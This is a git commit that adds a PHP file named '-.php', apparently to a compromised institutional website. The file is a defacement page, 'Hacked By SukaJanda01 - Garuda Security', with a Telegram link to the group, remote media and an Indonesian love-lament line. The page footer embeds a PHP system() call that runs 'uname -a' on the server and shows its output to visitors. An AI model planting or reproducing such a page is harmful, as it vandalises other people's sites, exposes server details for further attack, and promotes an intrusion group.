15e192e3a1bdd394dff1ecc536e2a9115ec33718
nastaindev <nastainpattimura@stikespasapua.ac.id>
2026-05-08 04:46:36 +0700

    Create -.php

---
+++ -.php
@@ -0,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacked By SukaJanda01 - Garuda Security</title>
+    <link rel="icon" type="image/x-icon" href="https://telegra.ph/file/f8e5b2de33ddaa512ccf7.jpg">
+    <meta name="description" content="Touch By SukaJanda01 - Garuda Security, showcasing the Touch and its impact." />
+    <meta name="keywords" content="Touch By SukaJanda01, Touch, Garuda Security, security breach" />
+    <meta name="robots" content="index, follow" />
+    <style>
+        html, body {
+            color: #000000; /* Changed text color to black for contrast */
+            font-family: 'Fredericka the Great', sans-serif;
+            font-weight: 100;
+            height: 100vh;
+            margin: 0;
+            background-color: #FFFFFF; /* Set background to white */
+        }
+        .full-height {
+            height: 100vh;
+        }
+        .flex-center {
+            align-items: center;
+            display: flex;
+            justify-content: center;
+        }
+        .position-ref {
+            position: relative;
+        }
+        .content {
+            text-align: center;
+        }
+        .title {
+            font-size: 36px;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body align="center" oncontextmenu="return false">
+    <div class="flex-center position-ref full-height">
+        <div class="content">
+            <div class="text">
+                <img src="https://i.pinimg.com/originals/93/00/bb/9300bb0fe7b968b4e94c01b1932cbcbb.gif" height="300" alt="Touch By SukaJanda01">
+                <br /><br />
+                <h1><code>Touch By SukaJanda01</code></h1>
+                <p><code>aku hanya bisa melihat mu bersama orang baru dan aku tidak bisa memiliki mu, karena kamu sudah ada yang baru</code></p>
+                <footer>
+                <?php system('uname -a'); ?>
+                    <p><code>Garuda Security 2017 - 2026</code></p>
+                    <p><code><a href="https://t.me/GarudaSecurityTeam" target="_blank" style="color: #0066cc; text-decoration: none;" onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">t.me/GarudaSecurityTeam</a></code></p>
+                </footer>
+                <audio controls="controls" src="https://d.top4top.io/m_3101v3w5t0.mp3"></audio>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
